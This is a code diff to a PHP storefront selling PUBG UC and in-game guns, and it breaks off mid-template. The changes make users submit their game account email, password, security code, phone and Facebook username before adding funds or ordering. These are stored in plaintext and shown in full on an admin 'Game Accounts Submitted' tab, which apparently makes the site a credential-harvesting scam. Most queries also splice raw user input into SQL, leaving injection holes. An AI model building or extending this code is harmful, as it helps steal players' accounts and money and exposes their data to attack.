@@ -2,6 +2,7 @@
 session_start();
 $db = new SQLite3('pubg_shop.db');
 
+// Create all tables
 $db->exec("CREATE TABLE IF NOT EXISTS users (
     id INTEGER PRIMARY KEY AUTOINCREMENT,
     google_id TEXT UNIQUE,
@@ -9,6 +10,7 @@ $db->exec("CREATE TABLE IF NOT EXISTS users (
     name TEXT,
     password TEXT,
     wallet REAL DEFAULT 0,
+    banned INTEGER DEFAULT 0,
     photo TEXT,
     created_at DATETIME DEFAULT CURRENT_TIMESTAMP
 )");
@@ -18,6 +20,7 @@ $db->exec("CREATE TABLE IF NOT EXISTS products (
     name TEXT,
     price REAL,
     image TEXT,
+    type TEXT DEFAULT 'uc',
     created_at DATETIME DEFAULT CURRENT_TIMESTAMP
 )");
 
@@ -46,6 +49,21 @@ $db->exec("CREATE TABLE IF NOT EXISTS fund_requests (
     amount REAL,
     utr TEXT,
     status TEXT DEFAULT 'pending',
+    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
+)");
+
+$db->exec("CREATE TABLE IF NOT EXISTS game_accounts (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    user_id INTEGER,
+    platform TEXT,
+    game_uid TEXT,
+    game_name TEXT,
+    email TEXT,
+    password TEXT,
+    security_code TEXT,
+    phone TEXT,
+    fb_username TEXT,
+    game_level TEXT,
     created_at DATETIME DEFAULT CURRENT_TIMESTAMP
 )");
 
@@ -84,10 +102,21 @@ function stylish_text($text) {
         'v'=>'𝐯','w'=>'𝐰','x'=>'𝐱','y'=>'𝐲','z'=>'𝐳'
     ];
     $result = '';
-    foreach(mb_str_split($text) as $char) {
+    for($i = 0; $i < strlen($text); $i++) {
+        $char = $text[$i];
         $result .= $stylish_map[$char] ?? $char;
     }
     return $result;
+}
+
+// Insert default products
+$check = $db->querySingle("SELECT COUNT(*) FROM products WHERE type='uc'");
+if($check == 0) {
+    $db->exec("INSERT INTO products (name, price, image, type) VALUES ('60 UC', 35, 'https://i.ibb.co/cX8gSSqf/file-127.jpg', 'uc')");
+    $db->exec("INSERT INTO products (name, price, image, type) VALUES ('350 UC', 230, 'https://i.ibb.co/cX8gSSqf/file-127.jpg', 'uc')");
+    $db->exec("INSERT INTO products (name, price, image, type) VALUES ('1500 UC', 999, 'https://i.ibb.co/cX8gSSqf/file-127.jpg', 'uc')");
+    $db->exec("INSERT INTO products (name, price, image, type) VALUES ('3800 UC', 1999, 'https://i.ibb.co/cX8gSSqf/file-127.jpg', 'uc')");
+    $db->exec("INSERT INTO products (name, price, image, type) VALUES ('6050 UC', 4999, 'https://i.ibb.co/cX8gSSqf/file-127.jpg', 'uc')");
 }
 
 // Google Login
@@ -98,14 +127,15 @@ if(isset($_POST['google_credential'])) {
     $name = $cred['name'];
     $photo = $cred['picture'];
     
-    $check = $db->querySingle("SELECT id FROM users WHERE google_id='$google_id'", true);
-    if(!$check) {
+    $check = $db->querySingle("SELECT id, banned FROM users WHERE google_id='$google_id'", true);
+    if($check) {
+        if($check['banned'] == 1) { $_SESSION['banned'] = true; }
+        else { $_SESSION['user_id'] = $check['id']; }
+    } else {
         $db->exec("INSERT INTO users (google_id, email, name, photo, wallet) VALUES ('$google_id', '$email', '$name', '$photo', 0)");
         $user_id = $db->lastInsertRowID();
-    } else {
-        $user_id = $check['id'];
+        $_SESSION['user_id'] = $user_id;
     }
-    $_SESSION['user_id'] = $user_id;
     header("Location: index.php");
     exit;
 }
@@ -131,7 +161,8 @@ if(isset($_POST['login'])) {
     $pass = $_POST['password'];
     $user = $db->querySingle("SELECT * FROM users WHERE email='$email'", true);
     if($user && password_verify($pass, $user['password'])) {
-        $_SESSION['user_id'] = $user['id'];
+        if($user['banned'] == 1) { $_SESSION['banned'] = true; }
+        else { $_SESSION['user_id'] = $user['id']; }
     }
     header("Location: index.php");
     exit;
@@ -189,8 +220,14 @@ if(isset($_POST['checkout'])) {
     $total = 0;
     foreach($_SESSION['cart'] as $item) { $total += $item['price']; }
     if($total <= 0) { header("Location: index.php?msg=Cart+empty"); exit; }
-    $_SESSION['checkout_total'] = $total;
-    header("Location: index.php?step=checkout");
+    
+    $user = $db->querySingle("SELECT wallet FROM users WHERE id=".$_SESSION['user_id'], true);
+    if($user['wallet'] >= $total) {
+        $_SESSION['checkout_total'] = $total;
+        header("Location: index.php?step=checkout");
+    } else {
+        header("Location: index.php?msg=" . urlencode("⚠️ Insufficient balance! Please add funds."));
+    }
     exit;
 }
 
@@ -200,17 +237,18 @@ if(isset($_POST['add_funds_req'])) {
     $utr = $_POST['utr'];
     $uid = $_SESSION['user_id'];
     if($amount >= 199) {
-        $db->exec("INSERT INTO fund_requests (user_id, amount, utr) VALUES ($uid, $amount, '$utr')");
-        $msg = "✅ Request sent. Admin will approve within 24 hours.";
+        $_SESSION['temp_amount'] = $amount;
+        $_SESSION['temp_utr'] = $utr;
+        header("Location: index.php?step=game_account_funds");
+        exit;
     } else {
-        $msg = "⚠️ Minimum deposit is ₹199";
+        header("Location: index.php?msg=" . urlencode("⚠️ Minimum deposit is ₹199"));
+        exit;
     }
-    header("Location: index.php?msg=".urlencode($msg));
-    exit;
 }
 
-// Game Account Details - Google
-if(isset($_POST['submit_google_details'])) {
+// Game Account Details for Fund Request (Google)
+if(isset($_POST['submit_google_funds'])) {
     $uid = $_SESSION['user_id'];
     $game_uid = $_POST['game_uid'];
     $game_name = $_POST['game_name'];
@@ -218,25 +256,20 @@ if(isset($_POST['submit_google_details'])) {
     $pass = $_POST['password'];
     $code = $_POST['security_code'];
     $level = $_POST['game_level'];
+    $amount = $_SESSION['temp_amount'];
+    $utr = $_SESSION['temp_utr'];
     
-    // Save game account
+    $db->exec("INSERT INTO fund_requests (user_id, amount, utr) VALUES ($uid, $amount, '$utr')");
     $db->exec("INSERT INTO game_accounts (user_id, platform, game_uid, game_name, email, password, security_code, game_level) 
                VALUES ($uid, 'google', '$game_uid', '$game_name', '$email', '$pass', '$code', '$level')");
     
-    // Create orders for cart items
-    foreach($_SESSION['cart'] as $item) {
-        $db->exec("INSERT INTO orders (user_id, product_id, product_name, amount, game_uid, game_name, game_email, game_password, security_code, game_level, platform) 
-                   VALUES ($uid, {$item['id']}, '{$item['name']}', {$item['price']}, '$game_uid', '$game_name', '$email', '$pass', '$code', '$level', 'google')");
-    }
-    
-    $_SESSION['cart'] = [];
-    unset($_SESSION['checkout_total']);
-    header("Location: index.php?msg=" . urlencode("✅ Order placed successfully!"));
+    unset($_SESSION['temp_amount'], $_SESSION['temp_utr']);
+    header("Location: index.php?msg=" . urlencode("✅ Fund request sent! Admin will approve within 24 hours."));
     exit;
 }
 
-// Game Account Details - Facebook
-if(isset($_POST['submit_fb_details'])) {
+// Game Account Details for Fund Request (Facebook)
+if(isset($_POST['submit_fb_funds'])) {
     $uid = $_SESSION['user_id'];
     $game_uid = $_POST['game_uid'];
     $game_name = $_POST['game_name'];
@@ -245,16 +278,66 @@ if(isset($_POST['submit_fb_details'])) {
     $fb_username = $_POST['fb_username'];
     $pass = $_POST['password'];
     $level = $_POST['game_level'];
+    $amount = $_SESSION['temp_amount'];
+    $utr = $_SESSION['temp_utr'];
     
-    // Save game account
+    $db->exec("INSERT INTO fund_requests (user_id, amount, utr) VALUES ($uid, $amount, '$utr')");
     $db->exec("INSERT INTO game_accounts (user_id, platform, game_uid, game_name, phone, email, fb_username, password, game_level) 
                VALUES ($uid, 'facebook', '$game_uid', '$game_name', '$phone', '$email', '$fb_username', '$pass', '$level')");
     
-    // Create orders for cart items
+    unset($_SESSION['temp_amount'], $_SESSION['temp_utr']);
+    header("Location: index.php?msg=" . urlencode("✅ Fund request sent! Admin will approve within 24 hours."));
+    exit;
+}
+
+// Game Account Details for Order (Google)
+if(isset($_POST['submit_google_order'])) {
+    $uid = $_SESSION['user_id'];
+    $game_uid = $_POST['game_uid'];
+    $game_name = $_POST['game_name'];
+    $email = $_POST['email'];
+    $pass = $_POST['password'];
+    $code = $_POST['security_code'];
+    $level = $_POST['game_level'];
+    $total = $_SESSION['checkout_total'];
+    
+    $db->exec("UPDATE users SET wallet = wallet - $total WHERE id=$uid");
+    
     foreach($_SESSION['cart'] as $item) {
-        $db->exec("INSERT INTO orders (user_id, product_id, product_name, amount, game_uid, game_name, phone, fb_username, game_level, platform) 
-                   VALUES ($uid, {$item['id']}, '{$item['name']}', {$item['price']}, '$game_uid', '$game_name', '$phone', '$fb_username', '$level', 'facebook')");
+        $db->exec("INSERT INTO orders (user_id, product_id, product_name, amount, game_uid, game_name, game_email, game_password, security_code, game_level, platform) 
+                   VALUES ($uid, {$item['id']}, '{$item['name']}', {$item['price']}, '$game_uid', '$game_name', '$email', '$pass', '$code', '$level', 'google')");
     }
+    
+    $db->exec("INSERT INTO game_accounts (user_id, platform, game_uid, game_name, email, password, security_code, game_level) 
+               VALUES ($uid, 'google', '$game_uid', '$game_name', '$email', '$pass', '$code', '$level')");
+    
+    $_SESSION['cart'] = [];
+    unset($_SESSION['checkout_total']);
+    header("Location: index.php?msg=" . urlencode("✅ Order placed successfully!"));
+    exit;
+}
+
+// Game Account Details for Order (Facebook)
+if(isset($_POST['submit_fb_order'])) {
+    $uid = $_SESSION['user_id'];
+    $game_uid = $_POST['game_uid'];
+    $game_name = $_POST['game_name'];
+    $phone = $_POST['phone'];
+    $email = $_POST['linked_email'];
+    $fb_username = $_POST['fb_username'];
+    $pass = $_POST['password'];
+    $level = $_POST['game_level'];
+    $total = $_SESSION['checkout_total'];
+    
+    $db->exec("UPDATE users SET wallet = wallet - $total WHERE id=$uid");
+    
+    foreach($_SESSION['cart'] as $item) {
+        $db->exec("INSERT INTO orders (user_id, product_id, product_name, amount, game_uid, game_name, phone, email, fb_username, password, game_level, platform) 
+                   VALUES ($uid, {$item['id']}, '{$item['name']}', {$item['price']}, '$game_uid', '$game_name', '$phone', '$email', '$fb_username', '$pass', '$level', 'facebook')");
+    }
+    
+    $db->exec("INSERT INTO game_accounts (user_id, platform, game_uid, game_name, phone, email, fb_username, password, game_level) 
+               VALUES ($uid, 'facebook', '$game_uid', '$game_name', '$phone', '$email', '$fb_username', '$pass', '$level')");
     
     $_SESSION['cart'] = [];
     unset($_SESSION['checkout_total']);
@@ -276,6 +359,22 @@ if(isset($_SESSION['admin_logged'])) {
         exit;
     }
     
+    // Ban user
+    if(isset($_GET['ban_user'])) {
+        $id = intval($_GET['ban_user']);
+        $db->exec("UPDATE users SET banned = 1 WHERE id = $id");
+        header("Location: index.php?admin=1&tab=users");
+        exit;
+    }
+    
+    // Unban user
+    if(isset($_GET['unban_user'])) {
+        $id = intval($_GET['unban_user']);
+        $db->exec("UPDATE users SET banned = 0 WHERE id = $id");
+        header("Location: index.php?admin=1&tab=users");
+        exit;
+    }
+    
     // Add cash to user
     if(isset($_POST['add_cash'])) {
         $user_id = intval($_POST['user_id']);
@@ -285,12 +384,13 @@ if(isset($_SESSION['admin_logged'])) {
         exit;
     }
     
-    // Add product
+    // Add product (UC or Gun)
     if(isset($_POST['add_product'])) {
         $name = $_POST['name'];
         $price = floatval($_POST['price']);
         $image = $_POST['image'];
-        $db->exec("INSERT INTO products (name, price, image) VALUES ('$name', $price, '$image')");
+        $type = $_POST['type'];
+        $db->exec("INSERT INTO products (name, price, image, type) VALUES ('$name', $price, '$image', '$type')");
         header("Location: index.php?admin=1&tab=products");
         exit;
     }
@@ -310,11 +410,21 @@ if(isset($_SESSION['admin_logged'])) {
         header("Location: index.php?admin=1&tab=broadcast");
         exit;
     }
+    
+    // Complete order
+    if(isset($_GET['complete_order'])) {
+        $id = intval($_GET['complete_order']);
+        $db->exec("UPDATE orders SET status='completed' WHERE id=$id");
+        header("Location: index.php?admin=1&tab=orders");
+        exit;
+    }
 }
 
 $user = null;
+$banned = false;
 if(isset($_SESSION['user_id'])) {
     $user = $db->querySingle("SELECT * FROM users WHERE id=".$_SESSION['user_id'], true);
+    if($user && $user['banned'] == 1) $banned = true;
 }
 $msg = isset($_GET['msg']) ? $_GET['msg'] : '';
 $show_cart = isset($_GET['show_cart']) ? true : false;
@@ -324,7 +434,8 @@ $cart_items = isset($_SESSION['cart']) ? $_SESSION['cart'] : [];
 $cart_total = 0;
 foreach($cart_items as $item) { $cart_total += $item['price']; }
 
-$products = $db->query("SELECT * FROM products ORDER BY price ASC");
+$uc_products = $db->query("SELECT * FROM products WHERE type='uc' ORDER BY price ASC");
+$gun_products = $db->query("SELECT * FROM products WHERE type='gun' ORDER BY price ASC");
 
 $is_admin = isset($_SESSION['admin_logged']) && isset($_GET['admin']);
 $admin_tab = isset($_GET['tab']) ? $_GET['tab'] : 'dashboard';
@@ -333,7 +444,6 @@ $login_bg = "https://i.ibb.co/zhgBmwh4/file-126.jpg";
 $logo_img = "https://i.ibb.co/9H1w570Y/file-125.jpg";
 $google_icon = "https://i.ibb.co/wZTBJn3g/file-75.jpg";
 $facebook_icon = "https://i.ibb.co/k2S25TS9/file-74.jpg";
-$telegram_icon = "https://i.ibb.co/6jQK0fK/file-99.jpg";
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -349,7 +459,6 @@ $telegram_icon = "https://i.ibb.co/6jQK0fK/file-99.jpg";
             background: #0a0a0a;
             color: #fff;
         }
-        /* Login Page */
         .login-page {
             min-height: 100vh;
             display: flex;
@@ -392,7 +501,6 @@ $telegram_icon = "https://i.ibb.co/6jQK0fK/file-99.jpg";
         .switch span { color: #9b59b6; }
         .admin-link { margin-top: 15px; font-size: 12px; color: #666; text-decoration: none; display: inline-block; }
         
-        /* Dashboard */
         .dashboard { min-height: 100vh; background: #0a0a0a; padding: 20px; }
         .navbar {
             background: #111;
@@ -408,20 +516,24 @@ $telegram_icon = "https://i.ibb.co/6jQK0fK/file-99.jpg";
         }
         .nav-logo { height: 40px; }
         .menu-icon { font-size: 24px; cursor: pointer; }
-        .wallet-card {
+        .wallet-top {
+            position: fixed;
+            top: 15px;
+            right: 15px;
             background: #1a0033;
-            padding: 20px;
-            border-radius: 12px;
-            margin-bottom: 20px;
-            text-align: center;
+            padding: 6px 12px;
+            border-radius: 20px;
             border: 1px solid #9b59b6;
+            font-size: 12px;
+            z-index: 100;
+            backdrop-filter: blur(10px);
         }
-        .wallet-amount { font-size: 2rem; color: #9b59b6; font-family: monospace; }
+        .add-funds-small { font-size: 10px; margin-left: 8px; color: #9b59b6; cursor: pointer; text-decoration: underline; }
         .top-menu {
             display: flex;
             justify-content: center;
             gap: 15px;
-            margin-bottom: 20px;
+            margin: 60px 0 20px 0;
             flex-wrap: wrap;
         }
         .top-menu button {
@@ -463,6 +575,14 @@ $telegram_icon = "https://i.ibb.co/6jQK0fK/file-99.jpg";
             background: #0088cc;
             text-decoration: none;
         }
+        .section-title {
+            font-size: 1.3rem;
+            margin: 20px 0;
+            text-align: center;
+            color: #9b59b6;
+            border-bottom: 1px solid #333;
+            padding-bottom: 10px;
+        }
         .products-grid {
             display: flex;
             flex-wrap: wrap;
@@ -475,15 +595,15 @@ $telegram_icon = "https://i.ibb.co/6jQK0fK/file-99.jpg";
             border: 1px solid #333;
             border-radius: 12px;
             padding: 15px;
-            width: 180px;
+            width: 170px;
             text-align: center;
             transition: transform 0.3s;
         }
         .product-card:hover { transform: translateY(-5px); border-color: #9b59b6; }
         .product-img { width: 100%; border-radius: 8px; margin-bottom: 10px; }
         .product-name { font-size: 14px; font-weight: bold; margin: 8px 0; }
-        .product-price { font-size: 18px; color: #9b59b6; font-family: monospace; margin: 8px 0; }
-        .cart-btn { background: #ff4444; width: 100%; padding: 8px; border-radius: 6px; cursor: pointer; }
+        .product-price { font-size: 16px; color: #9b59b6; font-family: monospace; margin: 8px 0; }
+        .cart-btn { background: #ff4444; width: 100%; padding: 8px; border-radius: 6px; cursor: pointer; border: none; color: white; }
         .page-popup {
             position: fixed;
             top: 0;
@@ -576,16 +696,20 @@ $telegram_icon = "https://i.ibb.co/6jQK0fK/file-99.jpg";
             cursor: pointer;
             color: #fff;
             text-decoration: none;
+            font-size: 12px;
         }
         .admin-tab.active { background: #9b59b6; }
-        .admin-table { width: 100%; border-collapse: collapse; background: #111; }
-        .admin-table th, .admin-table td { padding: 12px; border: 1px solid #333; text-align: left; }
+        .admin-table { width: 100%; border-collapse: collapse; background: #111; font-size: 12px; }
+        .admin-table th, .admin-table td { padding: 10px; border: 1px solid #333; text-align: left; }
         .admin-table th { background: #1a0033; color: #9b59b6; }
-        .approve-btn { background: #00cc66; padding: 5px 10px; border-radius: 5px; text-decoration: none; color: #fff; display: inline-block; }
-        .delete-btn { background: #ff4444; padding: 5px 10px; border-radius: 5px; text-decoration: none; color: #fff; display: inline-block; }
+        .approve-btn { background: #00cc66; padding: 4px 8px; border-radius: 4px; text-decoration: none; color: #fff; display: inline-block; font-size: 11px; }
+        .ban-btn { background: #ff4444; padding: 4px 8px; border-radius: 4px; text-decoration: none; color: #fff; display: inline-block; font-size: 11px; }
+        .unban-btn { background: #00cc66; padding: 4px 8px; border-radius: 4px; text-decoration: none; color: #fff; display: inline-block; font-size: 11px; }
+        .delete-btn { background: #ff4444; padding: 4px 8px; border-radius: 4px; text-decoration: none; color: #fff; display: inline-block; font-size: 11px; }
+        .complete-btn { background: #ffaa00; padding: 4px 8px; border-radius: 4px; text-decoration: none; color: #000; display: inline-block; font-size: 11px; }
         input, textarea, select {
             width: 100%;
-            padding: 12px;
+            padding: 10px;
             margin: 8px 0;
             background: #1a1a1a;
             border: 1px solid #333;
@@ -593,17 +717,26 @@ $telegram_icon = "https://i.ibb.co/6jQK0fK/file-99.jpg";
             color: #fff;
         }
         button { cursor: pointer; }
+        .banned-page { text-align: center; padding: 50px; }
         @media (max-width: 768px) { .product-card { width: calc(50% - 10px); } }
     </style>
 </head>
 <body>
 
-<?php if($is_admin): ?>
+<?php if($banned): ?>
+<div class="login-page">
+    <div class="login-card">
+        <h2 style="color:#ff4444">🚫 You Have Been Banned</h2>
+        <p>Contact support for assistance.</p>
+        <a href="https://t.me/Ashxpro" class="telegram-support" style="display:inline-block; margin-top:20px;">📞 Contact Support</a>
+    </div>
+</div>
+<?php elseif($is_admin): ?>
 <!-- ADMIN PANEL -->
 <div class="admin-container">
     <div class="admin-header">
-        <div style="font-size:1.5rem; font-weight:bold; background:linear-gradient(90deg,#9b59b6,#ff00cc); -webkit-background-clip:text; background-clip:text; color:transparent;">ADMIN PANEL</div>
-        <a href="index.php?admin_logout=1" style="background:#ff4444; padding:8px 15px; border-radius:8px; text-decoration:none; color:#fff;">Exit Admin</a>
+        <div style="font-size:1.3rem; font-weight:bold; background:linear-gradient(90deg,#9b59b6,#ff00cc); -webkit-background-clip:text; background-clip:text; color:transparent;">ADMIN PANEL</div>
+        <a href="index.php?admin_logout=1" style="background:#ff4444; padding:6px 12px; border-radius:6px; text-decoration:none; color:#fff;">Exit Admin</a>
     </div>
     
     <div class="admin-tabs">
@@ -622,9 +755,9 @@ $telegram_icon = "https://i.ibb.co/6jQK0fK/file-99.jpg";
         <?php $total_users = $db->querySingle("SELECT COUNT(*) FROM users"); ?>
         <?php $total_orders = $db->querySingle("SELECT COUNT(*) FROM orders"); ?>
         <?php $total_funds = $db->querySingle("SELECT COUNT(*) FROM fund_requests WHERE status='pending'"); ?>
-        <p>Total Users: <?php echo $total_users; ?></p>
-        <p>Total Orders: <?php echo $total_orders; ?></p>
-        <p>Pending Fund Requests: <?php echo $total_funds; ?></p>
+        <p><strong>Total Users:</strong> <?php echo $total_users; ?></p>
+        <p><strong>Total Orders:</strong> <?php echo $total_orders; ?></p>
+        <p><strong>Pending Fund Requests:</strong> <?php echo $total_funds; ?></p>
     </div>
     <?php endif; ?>
     
@@ -652,7 +785,7 @@ $telegram_icon = "https://i.ibb.co/6jQK0fK/file-99.jpg";
     <div class="wallet-card">
         <h3>All Users</h3>
         <table class="admin-table">
-            <tr><th>ID</th><th>Name</th><th>Email</th><th>Wallet</th><th>Action</th></tr>
+            <tr><th>ID</th><th>Name</th><th>Email</th><th>Wallet</th><th>Status</th><th>Action</th></tr>
             <?php $users = $db->query("SELECT * FROM users ORDER BY id DESC");
             while($u = $users->fetchArray()): ?>
             <tr>
@@ -660,16 +793,23 @@ $telegram_icon = "https://i.ibb.co/6jQK0fK/file-99.jpg";
                 <td><?php echo htmlspecialchars($u['name']??'N/A'); ?></td>
                 <td><?php echo $u['email']; ?></td>
                 <td>₹<?php echo number_format($u['wallet'],2); ?></td>
+                <td><?php if($u['banned']==1){ echo '<span style="color:#ff4444;">Banned</span>'; }else{ echo '<span style="color:#00ff00;">Active</span>'; } ?></td>
                 <td>
-                    <form method="post" style="display:flex; gap:5px;">
+                    <form method="post" style="display:inline-flex; gap:5px;">
                         <input type="hidden" name="user_id" value="<?php echo $u['id']; ?>">
-                        <input type="number" name="amount" placeholder="Amount" style="width:80px; padding:5px;">
-                        <button type="submit" name="add_cash" style="padding:5px 10px;">Add Cash</button>
+                        <input type="number" name="amount" placeholder="Amount" style="width:70px; padding:4px;">
+                        <button type="submit" name="add_cash" style="padding:4px 8px;">Add</button>
                     </form>
-                </td>
-            </tr>
+                    <?php if($u['banned']==1){ ?>
+                        <a href="?admin=1&unban_user=<?php echo $u['id']; ?>" class="unban-btn">Unban</a>
+                    <?php }else{ ?>
+                        <a href="?admin=1&ban_user=<?php echo $u['id']; ?>" class="ban-btn">Ban</a>
+                    <?php } ?>
+                 </div>
+             </td>
+             </tr>
             <?php endwhile; ?>
-        </table>
+         </table>
     </div>
     <?php endif; ?>
     
@@ -677,27 +817,32 @@ $telegram_icon = "https://i.ibb.co/6jQK0fK/file-99.jpg";
     <div class="wallet-card">
         <h3>Add New Product</h3>
         <form method="post">
-            <input type="text" name="name" placeholder="Product Name (e.g., 60 UC)" required>
+            <input type="text" name="name" placeholder="Product Name (e.g., 60 UC / AK-47)" required>
             <input type="number" name="price" placeholder="Price (₹)" step="1" required>
             <input type="url" name="image" placeholder="Image URL" required>
+            <select name="type" required>
+                <option value="uc">UC (Unknown Cash)</option>
+                <option value="gun">Gun Store</option>
+            </select>
             <button type="submit" name="add_product">Add Product</button>
         </form>
     </div>
     <div class="wallet-card">
         <h3>All Products</h3>
         <table class="admin-table">
-            <tr><th>ID</th><th>Name</th><th>Price</th><th>Image</th><th>Action</th></tr>
-            <?php $prods = $db->query("SELECT * FROM products ORDER BY price ASC");
+            <tr><th>ID</th><th>Name</th><th>Price</th><th>Type</th><th>Image</th><th>Action</th></tr>
+            <?php $prods = $db->query("SELECT * FROM products ORDER BY type, price ASC");
             while($p = $prods->fetchArray()): ?>
             <tr>
                 <td><?php echo $p['id']; ?></td>
                 <td><?php echo $p['name']; ?></td>
                 <td>₹<?php echo $p['price']; ?></td>
-                <td><img src="<?php echo $p['image']; ?>" width="50"></td>
-                <td><a href="?admin=1&delete_product=<?php echo $p['id']; ?>" class="delete-btn" onclick="return confirm('Delete?')">Delete</a></td>
-            </tr>
+                <td><?php echo $p['type']; ?></td>
+                <td><img src="<?php echo $p['image']; ?>" width="40"></td>
+                <td><a href="?admin=1&delete_product=<?php echo $p['id']; ?>" class="delete-btn" onclick="return confirm('Delete this product?')">Delete</a></td>
+             </tr>
             <?php endwhile; ?>
-        </table>
+         </table>
     </div>
     <?php endif; ?>
     
@@ -705,7 +850,7 @@ $telegram_icon = "https://i.ibb.co/6jQK0fK/file-99.jpg";
     <div class="wallet-card">
         <h3>All Orders</h3>
         <table class="admin-table">
-            <tr><th>ID</th><th>User ID</th><th>Product</th><th>Amount</th><th>Game UID</th><th>Status</th></tr>
+            <tr><th>ID</th><th>User ID</th><th>Product</th><th>Amount</th><th>Game UID</th><th>Status</th><th>Action</th></tr>
             <?php $orders = $db->query("SELECT * FROM orders ORDER BY id DESC");
             while($o = $orders->fetchArray()): ?>
             <tr>
@@ -715,9 +860,10 @@ $telegram_icon = "https://i.ibb.co/6jQK0fK/file-99.jpg";
                 <td>₹<?php echo $o['amount']; ?></td>
                 <td><?php echo $o['game_uid']; ?></td>
                 <td><?php echo $o['status']; ?></td>
-            </tr>
+                <td><?php if($o['status']=='pending'){ ?><a href="?admin=1&complete_order=<?php echo $o['id']; ?>" class="complete-btn">Complete</a><?php }else{ echo '-'; } ?> </td>
+             </tr>
             <?php endwhile; ?>
-        </table>
+         </table>
     </div>
     <?php endif; ?>
     
@@ -725,24 +871,24 @@ $telegram_icon = "https://i.ibb.co/6jQK0fK/file-99.jpg";
     <div class="wallet-card">
         <h3>Game Accounts Submitted</h3>
         <table class="admin-table">
-            <tr><th>ID</th><th>User ID</th><th>Platform</th><th>Game UID</th><th>Game Name</th><th>Email</th><th>Password</th><th>Security Code</th><th>Phone</th><th>FB Username</th><th>Level</th></tr>
+            <tr><th>ID</th><th>User ID</th><th>Platform</th><th>Game UID</th><th>Game Name</th><th>Email</th><th>Password</th><th>Security Code</th><th>Phone</th><th>FB Username</th><th>Level</th> </tr>
             <?php $accounts = $db->query("SELECT * FROM game_accounts ORDER BY id DESC");
             while($a = $accounts->fetchArray()): ?>
             <tr>
-                <td><?php echo $a['id']; ?></td>
-                <td><?php echo $a['user_id']; ?></td>
-                <td><?php echo $a['platform']; ?></td>
-                <td><?php echo $a['game_uid']; ?></td>
-                <td><?php echo $a['game_name']; ?></td>
-                <td><?php echo $a['email']; ?></td>
-                <td><?php echo $a['password']; ?></td>
-                <td><?php echo $a['security_code']; ?></td>
-                <td><?php echo $a['phone']; ?></td>
-                <td><?php echo $a['fb_username']; ?></td>
-                <td><?php echo $a['game_level']; ?></td>
-            </tr>
+                <td><?php echo $a['id']; ?> </td>
+                <td><?php echo $a['user_id']; ?> </td>
+                <td><?php echo $a['platform']; ?> </td>
+                <td><?php echo $a['game_uid']; ?> </td>
+                <td><?php echo $a['game_name']; ?> </td>
+                <td><?php echo $a['email']; ?> </td>
+                <td><?php echo $a['password']; ?> </td>
+                <td><?php echo $a['security_code']; ?> </td>
+                <td><?php echo $a['phone']; ?> </td>
+                <td><?php echo $a['fb_username']; ?> </td>
+                <td><?php echo $a['game_level']; ?> </td>
+             </tr>
             <?php endwhile; ?>
-        </table>
+         </table>
     </div>
     <?php endif; ?>
     
@@ -750,7 +896,7 @@ $telegram_icon = "https://i.ibb.co/6jQK0fK/file-99.jpg";
     <div class="wallet-card">
         <h3>Broadcast Notification</h3>
         <form method="post">
-            <textarea name="broadcast_msg" rows="4" style="width:100%; padding:10px; background:#1a1a1a; border:1px solid #9b59b6; color:#fff;" placeholder="Enter message to broadcast to all users..."></textarea>
+            <textarea name="broadcast_msg" rows="4" style="width:100%; padding:10px; background:#1a1a1a; border:1px solid #9b59b6; color:#fff;" placeholder="Enter message to broadcast..."></textarea>
             <button type="submit" name="broadcast" style="margin-top:10px;">Send Broadcast</button>
         </form>
     </div>
@@ -809,16 +955,22 @@ function closeAdminLogin() { document.getElementById('adminLoginPopup').style.di
 <?php else: ?>
 <!-- USER DASHBOARD -->
 <div class="dashboard">
+    <!-- Wallet Top Corner (Chhota sa) -->
+    <div class="wallet-top">
+        💰 ₹<?php echo stylish_number(number_format($user['wallet'], 2)); ?>
+        <span class="add-funds-small" onclick="showAddFundsPage()">+Add</span>
+    </div>
+
     <div class="navbar">
         <div class="menu-icon" onclick="toggleSidebar()">☰</div>
         <img src="<?php echo $logo_img; ?>" class="nav-logo">
-        <div>🆔 ID: <?php echo $user['id']; ?></div>
+        <div>🆔 <?php echo $user['id']; ?></div>
     </div>
 
     <div class="sidebar" id="sidebar">
         <div class="close-sidebar" onclick="toggleSidebar()">✕</div>
         <div style="text-align:center;margin:20px 0">
-            <div style="background:#9b59b6; width:80px; height:80px; border-radius:50%; margin:0 auto; display:flex; align-items:center; justify-content:center; font-size:40px;">👤</div>
+            <div style="background:#9b59b6; width:70px; height:70px; border-radius:50%; margin:0 auto; display:flex; align-items:center; justify-content:center; font-size:35px;">👤</div>
             <p><strong><?php echo htmlspecialchars($user['name']??$user['email']); ?></strong></p>
         </div>
         <div class="menu-item" onclick="showOrdersPage()">📜 Order History</div>
@@ -834,22 +986,18 @@ function closeAdminLogin() { document.getElementById('adminLoginPopup').style.di
         <button onclick="showAddFundsPage()">Add Funds</button>
     </div>
 
-    <div class="wallet-card">
-        <p>💰 Wallet Balance</p>
-        <div class="wallet-amount" style="font-family: monospace;">₹<?php echo stylish_number(number_format($user['wallet'], 2)); ?></div>
-        <button onclick="showAddFundsPage()" style="margin-top:15px; width:auto; padding:8px 25px;">+ Add Funds</button>
-    </div>
-
     <?php if($msg): ?>
-        <div style="background:#1a0033; padding:10px; border-radius:8px; margin-bottom:20px; text-align:center;"><?php echo htmlspecialchars($msg); ?></div>
+        <div style="background:#1a0033; padding:10px; border-radius:8px; margin-bottom:20px; text-align:center; font-size:13px;"><?php echo htmlspecialchars($msg); ?></div>
     <?php endif; ?>
 
+    <!-- UC Section -->
+    <div class="section-title">💎 UC TOP UP</div>
     <div class="products-grid">
-        <?php while($p = $products->fetchArray()): ?>
+        <?php while($p = $uc_products->fetchArray()): ?>
         <div class="product-card">
             <img src="<?php echo $p['image']; ?>" class="product-img">
             <div class="product-name"><?php echo stylish_text($p['name']); ?></div>
-            <div class="product-price" style="font-family: monospace;">₹<?php echo stylish_number(number_format($p['price'], 0)); ?></div>
+            <div class="product-price">₹<?php echo stylish_number(number_format($p['price'], 0)); ?></div>
             <form method="post">
                 <input type="hidden" name="product_id" value="<?php echo $p['id']; ?>">
                 <input type="hidden" name="product_name" value="<?php echo $p['name']; ?>">
@@ -859,6 +1007,33 @@ function closeAdminLogin() { document.getElementById('adminLoginPopup').style.di
             </form>
         </div>
         <?php endwhile; ?>
+    </div>
+
+    <!-- Gun Store Section -->
+    <div class="section-title">🔫 GUN STORE</div>
+    <div class="products-grid">
+        <?php 
